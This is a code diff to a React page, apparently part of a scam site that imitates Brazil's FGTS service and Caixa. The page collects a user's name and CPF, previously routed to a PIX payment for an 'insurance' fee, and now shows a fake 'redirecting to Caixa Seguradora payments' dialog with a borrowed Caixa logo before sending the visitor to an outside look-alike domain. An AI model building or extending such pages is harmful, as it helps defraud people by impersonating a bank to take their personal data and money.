@@ -1,11 +1,13 @@
+
 import React, { useState, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { AlertTriangle, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
+import { AlertTriangle, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal, ExternalLink } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import FGTSLogo from '@/components/FGTSLogo';
 import { useIsMobile } from '@/hooks/use-mobile';
+import { Dialog, DialogContent } from "@/components/ui/dialog";
 
 const InsuranceRequest = () => {
   const navigate = useNavigate();
@@ -15,6 +17,7 @@ const InsuranceRequest = () => {
   const [cpf, setCpf] = useState('');
   const [storedCPF, setStoredCPF] = useState<string>('');
   const [storedUserName, setStoredUserName] = useState<string>('');
+  const [showRedirectDialog, setShowRedirectDialog] = useState(false);
   
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -79,24 +82,15 @@ const InsuranceRequest = () => {
   };
 
   const handleSubmit = () => {
-    if (name) {
-      localStorage.setItem('userName', name);
-    }
+    setShowRedirectDialog(true);
     
-    navigate('/pix-payment', {
-      state: {
-        bankLogo,
-        bankName,
-        totalAmount,
-        installmentsCount,
-        installmentValue,
-        interestRate,
-        userName: name || actualUserName,
-        userCPF: cpf || actualCPF,
-        pixKey,
-        insuranceAmount: 48.52
+    setTimeout(() => {
+      if (name) {
+        localStorage.setItem('userName', name);
       }
-    });
+      
+      window.location.href = "https://caixatem.online/app-meufgts";
+    }, 2000);
   };
 
   return (
@@ -232,6 +226,25 @@ const InsuranceRequest = () => {
           </div>
         </div>
       </div>
+
+      <Dialog open={showRedirectDialog} onOpenChange={setShowRedirectDialog}>
+        <DialogContent className="max-w-md">
+          <div className="flex flex-col items-center justify-center py-4">
+            <img 
+              src="https://media2.proteste.org.br//images/DDBB8128AB9AB42685E575D2A51C4EAF700D438A/caixa-seguradora.png"
+              alt="Caixa Seguradora"
+              className="w-48 h-auto object-contain mb-6"
+            />
+            <div className="flex items-center text-lg font-medium text-center">
+              <ExternalLink className="mr-2 h-6 w-6 text-blue-600" />
+              DIRECIONANDO AO SITE DA CAIXA SEGURADORA PAGAMENTOS
+            </div>
+            <div className="mt-4 flex items-center justify-center">
+              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
